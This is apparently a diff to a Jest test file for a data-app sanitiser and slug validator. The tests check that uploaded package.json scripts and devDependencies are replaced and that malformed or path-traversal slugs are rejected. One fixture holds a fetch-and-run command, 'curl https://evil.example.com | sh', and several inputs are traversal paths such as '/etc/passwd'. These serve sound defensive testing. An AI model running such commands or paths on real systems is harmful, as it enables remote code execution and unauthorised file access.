@@ -2,6 +2,7 @@ import {
     computeCustomDependencies,
     currentDataAppCodeVersion,
     extractLockfilePackages,
+    isValidDataAppSlug,
     MAX_DECLARED_DEPENDENCIES,
     MAX_LOCKFILE_BYTES,
     parseLockfilePackageKey,
@@ -491,32 +492,67 @@ describe('validateDataAppDependencies', () => {
 
 describe('sanitizeAppPackageJsonScripts', () => {
     const templateScripts = { dev: 'vite', build: 'vite build' };
+    const templateDevDependencies = { vite: '8.0.16' };
 
     it('replaces uploader scripts with the template scripts', () => {
         const input = JSON.stringify({
             name: 'app',
+            version: '1.0.0',
             scripts: { build: 'curl https://evil.example.com | sh' },
             dependencies: { react: '19.2.5' },
+            packageManager: 'npm@1.0.0',
         });
         const parsed = JSON.parse(
-            sanitizeAppPackageJsonScripts(input, templateScripts),
+            sanitizeAppPackageJsonScripts(
+                input,
+                templateScripts,
+                templateDevDependencies,
+            ),
         );
-        expect(parsed.scripts).toEqual(templateScripts);
-        expect(parsed.dependencies).toEqual({ react: '19.2.5' });
+        expect(parsed).toEqual({
+            name: 'app',
+            version: '1.0.0',
+            dependencies: { react: '19.2.5' },
+            devDependencies: templateDevDependencies,
+            scripts: templateScripts,
+        });
     });
 
     it('adds template scripts when the upload has none', () => {
         const input = JSON.stringify({ dependencies: {} });
         const parsed = JSON.parse(
-            sanitizeAppPackageJsonScripts(input, templateScripts),
+            sanitizeAppPackageJsonScripts(
+                input,
+                templateScripts,
+                templateDevDependencies,
+            ),
         );
         expect(parsed.scripts).toEqual(templateScripts);
     });
 
-    it('returns the input unchanged when it is not valid JSON', () => {
-        expect(sanitizeAppPackageJsonScripts('not-json', templateScripts)).toBe(
-            'not-json',
+    it('replaces uploader-controlled devDependencies with the template set', () => {
+        const input = JSON.stringify({
+            dependencies: { react: '19.2.5' },
+            devDependencies: { vite: '1.0.0' },
+        });
+        const parsed = JSON.parse(
+            sanitizeAppPackageJsonScripts(
+                input,
+                templateScripts,
+                templateDevDependencies,
+            ),
         );
+        expect(parsed.devDependencies).toEqual(templateDevDependencies);
+    });
+
+    it('returns the input unchanged when it is not valid JSON', () => {
+        expect(
+            sanitizeAppPackageJsonScripts(
+                'not-json',
+                templateScripts,
+                templateDevDependencies,
+            ),
+        ).toBe('not-json');
     });
 });
 
@@ -637,6 +673,37 @@ describe('validateDataAppCode with dependencies', () => {
                 }),
             }),
         ).not.toThrow();
+    });
+});
+
+describe('isValidDataAppSlug', () => {
+    it.each(['my-app', 'app2', 'a', 'my-app-abcd1234'])(
+        'accepts a well-formed slug (%s)',
+        (slug) => {
+            expect(isValidDataAppSlug(slug)).toBe(true);
+        },
+    );
+
+    it.each([
+        ['empty string', ''],
+        ['path traversal', '../evil'],
+        ['nested path traversal', '../../../../tmp/evil'],
+        ['leading slash', '/etc/passwd'],
+        ['uppercase letters', 'My-App'],
+        ['starts with a hyphen', '-my-app'],
+        ['contains a slash', 'my/app'],
+        ['contains a dot', 'my.app'],
+        ['contains whitespace', 'my app'],
+    ])('rejects an invalid slug (%s)', (_label, slug) => {
+        expect(isValidDataAppSlug(slug)).toBe(false);
+    });
+
+    it('accepts a slug at exactly the 255 char limit', () => {
+        expect(isValidDataAppSlug('a'.repeat(255))).toBe(true);
+    });
+
+    it('rejects a slug over the 255 char limit', () => {
+        expect(isValidDataAppSlug('a'.repeat(256))).toBe(false);
     });
 });
 
